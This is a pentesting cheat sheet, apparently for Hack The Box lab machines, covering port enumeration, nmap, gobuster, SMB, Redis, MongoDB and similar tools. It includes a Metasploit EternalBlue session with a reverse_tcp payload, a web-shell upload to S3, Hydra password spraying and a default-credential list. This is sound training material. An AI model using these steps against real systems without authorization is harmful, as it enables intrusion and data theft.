# Table of Contents
* [Ports](#ports)
   * [Port 80 Frameworks](#port-80-frameworks)
* [Useful Bash Commands](#useful-bash-commands)
* [Tools](#tools-and-resources)
   * [linPeas](#linpeas)
   * [nmap](#nmap)
   * [smbclient](#smbclient)
   * [redis-cli](#redis-cli)
   * [xfreeRDP](#xfreerdp)
   * [gobuster](#gobuster)
   * [mongoSH](#mongosh)
   * [rsync](#rsync)
   * [metasploit](#metasploit)
   * [mySQL](#mysql)
   * [AWS/S3](#awss3)
   * [Vim](#vim)
   * [FTP](#ftp)
   * [SNMP](#snmp)
   * [Hydra](#hydra)
   * [grep](#grep)
   * [psexec](#psexec)
   * [NetCat/ncat](#netcatncat)
* [Resources](#resources)
* [Data Sources](#data-sources)
* [Checklist](#checklist)
* [Useful Info](#useful-info)


# Ports

|   #   | Type | Name     | Notes         | Exploits      |
| ----- | ---- | -------- | ------------- | ------------- |
| [21](https://www.speedguide.net/port.php?port=21)    | TCP  | FTP      | vsftpd 3.0.3  | Anonymous login |
| 22    | TCP  | ssh      | | |
| 23    | TCP  | telnet   | Linux telnetd | Guess root login |
| 80    | TCP  | http     | See table below  | Many |
| 135   | TCP  | msrpc    | MS Remote Procedure Call | |
| 443   | TCP  | https    | 
| 445   | TCP  | SMB      | Server Message Block, microsoft-ds? | smbclient, misconfig'd user, metasploit |
| 873   | TCP  | rsync    | (protocol version 31) | misconfig'd anonymous |
| 27017 | TCP  | mongodb  | MongoDB 3.6.8 | mongosh |
| 3306  | TCP  | mysql?   | | |
| 3389  | TCP  | ms-wbt-server | Microsoft Terminal Services | xfreerdp |
| 6379  | TCP  | redis    | Redis key-value store 5.0.7 | 
| 8080  | TCP  | jenkins  | | |

A useful tool for understanding more about each port is the speedguide website.
`https://www.speedguide.net/port.php?port={port}`

## Port 80 frameworks

| Framework | Version | Tools/exploits |
| --------- | ------- | -------------- |
| nginx | 1.14.2 | gobuster |
| freepbx | 16.0.40.7 | CVE-2025-57819 |
| s3 | <all> | aws cli |
<br>

# Useful BASH commands
### Retrieve a webpage
`$ curl -i http://10.10.110.100:65000/`

### Scan open ports for service and version info
`$ sudo nmap -sV -sC {target_ip}`

### Add to /etc/hosts file
`$ echo "{target_ip} subdomain.domain.com" | sudo tee -a /etc/hosts`

### Find local machine's tun0 and IP
`$ ifconfig`

### Starting an NCAT listener
`$ nc -nvlp 1337`

### Starting a file server from the local directory you want to serve
`$ python3 -m http.server 8000`

### Creating a stable shell from a reverse-shell
`$ script /dev/null -c /bin/bash`

### Fast filesystem search from indexed database
`$ locate sample.txt`

### View contents of a file
`$ cat /filepath/filename.txt`

### Download a file
`$ get /fielpath/filename.txt`

### Find files
```bash
// . determines search from current directory
$ find . -name "filename.txt"

// / lets you search from root
$ find / -name "filename.txt"

// Add wildcards to name pattern with *
$ find / -name "*name*"
```

### Find printable strings in non-text files
`$ strings /path/to/file`

<br>

# Tools and resources
## [linPeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
### Type: Escalation

## [nmap](https://nmap.org/book/man.html)
### Type: Discovery

`$ sudo nmap -sV {target_ip}`

```bash
# Useful switches
-p- : This flag scans for all TCP ports ranging from 0-65535
-sV : Attempts to determine the version of the service running on a port
--min-rate : This is used to specify the minimum number of packets that Nmap should send 
per second; it speeds up the scan as the number goes higher
-sC : run useful scripts to retrieve additional information
--script {script_name} -p {port}: run a specfic script
-Pn : skip discovery phase that may trigger detection, treat all ports as open
-T4, -T5 : speed controls
--min-rate : 
--max-retries :
```

Scan top UDP ports
`$ sudo nmap -sU --top-ports 20 10.10.110.2`

Scan UDP with version info (when previous gives you open|filtered results)
`$ sudo nmap -sU -sV --top-ports 20 10.10.110.2`

Perform a ping sweep for discovery of alive hosts on the subnet that respond to discovery probes
`$ nmap -sn 10.10.110.0/24`

Port scan across a subnet (great for on a firewall)
`$ sudo nmap -Pn -T4 --min-rate 1000 --top-ports 100 10.10.110.0/24`

Deep scan on a host
`$ sudo nmap -Pn -p- -sV -T4 10.10.110.100`

Tip: To see progress, press the `Space` bar

## [smbclient]()
### Type: Connector
#### List all clients
`$ smbclient -L {target_ip}`

#### Connect to a client
`$ smbclient \\\\{target_ip}\\{shareName}`

#### Force a specific version
`--option='client min protocol=NT1'`

#### Specify a user to login
`-U {username}`

```bash
ls : listing contents of the directories within the share
cd : changing current directories within the share
get : downloading the contents of the directories within the share
exit : exiting the smb shell
```

## [redis-cli]()
### Type: Connector
#### Installing redis-cli command line tools
`$ sudo apt install redis-tools`

#### Connect to redis using hostname -h
`$ redis-cli -h {target_IP}`

#### Useful commands when connected
```bash
> info  # Get serve info
> select 0  # Select a database
> keys *  # List all available keys
> get <key>  # Retrieve the stored value for the specified key
```

## [xfreerdp](www.freerdp.com)
### Type: Remote Desktop Tool
#### Installing xfreerdp

```bash
# Install one of the following
sudo apt-get install freerdp2-x11
sudo apt-get install freerdp3-x11
```

```bash
# Useful switches
/cert:ignore : Specifies to the scrips that all security certificate usage should be 
ignored.
/u:Administrator : Specifies the login username to be "Administrator".
/v:{target_IP} : Specifies the target IP of the host we would like to connect to.
```

## [gobuster]()
### Type: FUZZ
#### Installing gobuster
```bash
# Install using package manager
$ sudo apt install gobuster
```

```bash
# Install by compiling source
$ sudo git clone https://github.com/OJ/gobuster.git
$ cd gobuster
$ go get && go build
$ go install
```

```bash
# Useful switches
dir : specify we are using the directory busting mode of the tool
-w : specify a wordlist, a collection of common directory names that are typically used 
for sites
-u : specify the targets IP address
-x {filetype} : look for specific file types
-b 302,404 : exclude certain web codes
vhost : Uses VHOST for brute-forcing
-x php,html,txt : also test each word with those extensions, so you catch files like login.php or backup.txt, not just bare directories
-t 50 : (threads) if it feels slow, though don't crank it too high against a lab box.
```

#### Populate a wordlist
`$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -O /usr/share/wordlists/common.txt`


#### Running gobuster looking for directories
`$ sudo gobuster dir -w /usr/share/wordlists/common.txt -u http://{target_IP}`

#### In parrot.os
`$ sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://{target_ip}`

#### Running gobuster looking for subdomains
`gobuster vhost -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb`


#### Other useful files
```
# Directories
DirBuster-2007_directory-list-2.3-big.txt

# Subdomains
subdomains-top1million-110000.txt
subdomains-top1million-20000.txt
```

## [mongosh](https://www.mongodb.com/try/download/shell)
### Type: Mongo DB Shell
#### Installation

```bash
$ curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz
$ tar xvf mongosh-2.3.2-linux-x64.tgz
$ cd mongosh-2.3.2-linux-x64/bin
```

#### Connecting to a Mongo DB
`$ ./mongosh mongodb://{target_IP}:27017`

#### Exploring the database

```bash
# List databases
$ show dbs;

# Select a database
$ use {database_name};
# eg. $ use sensitive_information;

# List collections within the database
$ show collections;

# Dump contents of collection
$ db.{collection_name}.find();
# eg. $ db.flag.find();
```

## [rsync](https://linux.die.net/man/1/rsync)
### Type: Connector/ File Transfer
#### Using rsync

```bash
# list available directories
$ rsync --list-only {target_IP}::

# list files within a share
$ rsync --list-only {target_IP}::{directory_name}
# eg. rsync --list-only {target_IP}::public

# transfer file to local machine
$ rsync {target_IP}::{remote_dir}/{filename} {local_filename}
# eg. rsync {target_IP}::public/flag.txt flag.txt
```

## [metasploit]()
### Type: Exploit search and deploy
#### Using metasploit

```bash
# Start metasploit console
$ msfconsole
```

In this example, we use a known vulnerability for SMB called `eternalblue`, which forces a command prompt session on the target system.

```bash
# Search msf for a specific exploit
[msf](Jobs:0 Agents:0) >> search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7
   ...

# Select the exploit and variation you want to use     
[msf](Jobs:0 Agents:0) >> use 2
[*] Additionally setting TARGET => Windows 7
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

# Set target
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set rhosts 10.129.53.118
rhosts => 10.129.53.118

# Set attacking machine
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set lhost 10.10.14.66
lhost => 10.10.14.66

# Set attacking machine port IMPORTANT FOR SUCCESS -> meterpreter
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set lport 4445
lport => 4445
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> show options
...
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set VERIFY_ARCH true
VERIFY_ARCH => true
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set VERIFY_TARGET true
VERIFY_TARGET => true

# Start the exploit attack
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run
```

## [mysql]()
### Type: Connector
#### Install mysql command line tools
`sudo apt update && sudo apt install mysql*`

#### Connect to mysql server
`mysql -h {target_ip} -u {username}`

#### If getting SSL errors add
`--ssl-verify-server-cert=FALSE`

#### Useful commands when connected
```bash 
MariaDB [htb]> SHOW databases;

MariaDB [htb]> USE {database_name};

MariaDB [htb]> SHOW tables;

MariaDB [htb]> SELECT * FROM {table_name};
```

## [AWS/S3]()
### Type: Connector
#### Indicator
If you come across additional subdomains or webpages that only load the following, you more than likely are dealing with an AWS S3 bucket for storage.
`{"status": "running"}`

#### Installing AWS cli tools
`apt install awscli`

Next is to try arbitrary config settings to gain access.

```bash
$ aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

If successful, we can use the following useful commands.

```bash
# list all available buckets
aws --endpoint=http://s3.thetoppers.htb s3 ls

# list all objects in a specific bucket
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

# copy items from home directory to bucket
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

## [Vim](https://vimsheet.com/)
### Type: Text Editor
#### Starting Vim
Existing file
`$ vim /etc/hosts`

New file
`$ vim /path/newfile.txt`

#### Modes
```bash
# Insert mode
i

# normal mode
esc

# command mode
:
```

#### Normal mode commands
| Command | Description |
| ------- | ----------- |
| x | Cut character |
| dw | Cut word |
| dd | Cut full line |
| yw | Copy word |
| yy | Copy full line |
| p | paste |

#### Command mode commands
| Command | Description |
| ------- | ----------- |
| :1 | Go to line number 1 |
| :w | Write the file, save |
| :q | Quit |
| :q! | Quit without saving |
| :wq | Write and quit |

## [FTP]()
### Type: Connector
### Useful commands

```bash
# Connect to a remote machine via ftp
$ ftp 10.129.10.10
# or
$ ftp username@10.129.10.10

# Download a file
ftp> get filename.txt

# Exit FTP session
ftp> exit
```

## [SNMP]()
### Type: Discovery
#### Initializing
`$ snmpwalk -v 2c -c public 10.129.10.10`

## [Hydra]()
### Type: Password Sprayer
#### Installing Hydra
`$ sudo apt-get install hydra`

#### Running Hydra
After compiling a file of all usernames to try, without domains, use the following to test a password on each.
`$ hydra -L usernames.txt -p 'funnel123#!#' {target_IP} ssh`

## [grep]()
### Type: Search
#### Search for a pattern in specific files
`$ grep -i 'hello world' menu.h main.c`

#### Useful flags
```bash
-i : ignore case
-v : invert match, show results where no match is found
```

## [psexec](https://github.com/SecureAuthCorp/impacket)
### Type: Shell
#### Installation
```bash
$ git clone https://github.com/SecureAuthCorp/impacket.git
$ cd impacket
$ pip3 install .
# OR:
$ sudo python3 setup.py installbash
```

#### Usage
`$ python psexec.py username:password@hostIP // with authentication`

`$ psexec.py username@hostIP // without password`

## [Netcat/NCAT](https://nmap.org/ncat/guide/index.html)
### Type: Connector
#### Usage

Target a specific port
`$ nc -v 10.10.110.2 4000`

<br>

# Resources

| Resource | Notes |
| -------- | ----- |
| [Reverse shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) | Shows reverse shell methods by product/platform |
| [Hacktricks](https://hacktricks.wiki/en/index.html) | Pentest wiki |
| [stmcyber](https://blog.stmcyber.com/) | Blog |
| [Server Side Template Injection](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) | SSTI Overview |

<br>

# Data Sources
| Name | Decription |
| ---- | ---------- |
| [danielmiessler](https://github.com/danielmiessler/SecLists) | Full SecLists collection |

<br>


# Checklist

Process
1. Find the host
2. Enumerate the host

- Host discovery
- Port scan (nmap)
ftp anonymous
- website? what kind
- find additional pages (gobuster)
- find additional subdomains
/etc/hosts file for resolving domains


# Useful Info
## Common Password Combos
| user:password |
| --------- |
| admin:password |
| admin:admin |
| root:root |
| root:password |
| admin:admin1 |
| admin:password1 |
| root:password1 |
| admin:admin123 |
| admin: |